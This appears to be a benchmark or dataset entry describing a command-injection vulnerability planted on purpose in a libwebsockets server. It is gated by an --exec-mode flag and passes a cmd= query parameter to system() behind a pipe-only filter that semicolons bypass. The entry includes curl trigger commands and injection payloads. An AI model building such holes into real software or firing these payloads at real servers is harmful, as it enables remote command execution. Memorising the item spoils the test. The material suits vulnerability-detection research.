DESCRIPTION:
  CLI-flag-gated command injection in a libwebsockets HTTP server. The server
  must be started with --exec-mode for the vulnerable /exec endpoint to be
  reachable. A user-supplied URL query parameter (cmd=) is staged through an
  intermediate snprintf buffer and passed to system() after pipe-character
  filtering (bypassable with semicolons).

CONFIG_GATE (C1 — simple):
  mechanism:  CLI flag (--exec-mode), stored in global int exec_mode.
  check:      `if (exec_mode && strncmp(in, "/exec", 5) == 0 ...)`
              single boolean guard in callback_http().
  complexity: one condition, one flag, no struct, no file parsing

INPUT_FLOW (I2 — snprintf buffer then system()):
  entry:      HTTP GET /exec?cmd=<payload>  →  lws_get_urlarg_by_name_safe()
  path:       handle_exec() extracts "cmd" into char raw[256]
              after S2 check, snprintf(cmd, sizeof(cmd), "%s", raw) copies
              to intermediate cmd[320] buffer
              system(cmd) is called with the staged buffer
  transforms: URL arg decode by lws, then snprintf copy (content unchanged)

SANITIZATION (S2 — block '|', bypass ';'):
  cmd_permitted() rejects any command containing the '|' character.
  Bypass: use ';' to chain commands — e.g. cmd=id;id>/tmp/marker

SINK:        system() inside handle_exec() in server.c

CHANGED FILES:
  server.c — 3 hunks:
    1. global:            added `exec_mode` global int
    2. cmd_permitted():   S2 sanitization — rejects '|'
    3. handle_exec():     URL arg → raw[] → S2 check → snprintf → system()
    4. callback_http():   C1 gate — exec_mode + /exec URL prefix check
    5. main():            --exec-mode flag parsing

EXPLOIT:
  build:   bash build.sh
  start:   ./lws_server --port 18110 --wwwroot /tmp/www --exec-mode
  trigger: curl 'http://127.0.0.1:18110/exec?cmd=id>/tmp/pwned'
  verify:  cat /tmp/pwned
  expect:  uid=... line written by the server process

  gate bypass: omitting --exec-mode causes /exec to fall through to the
               file-serving mount and return 404.
  S2 bypass:   use ';' instead of '|' — e.g. cmd=id;cat>/tmp/pwned

NOTES:
  - system() output goes to the server's stderr (inherited fd), not the
    HTTP response body. Use a write-to-file payload to confirm blind execution.
  - The snprintf(cmd, sizeof(cmd), "%s", raw) copy (I2) adds no sanitization;
    all non-pipe shell metacharacters pass through unchanged.
  - lws_get_urlarg_by_name_safe() URL-decodes the argument.
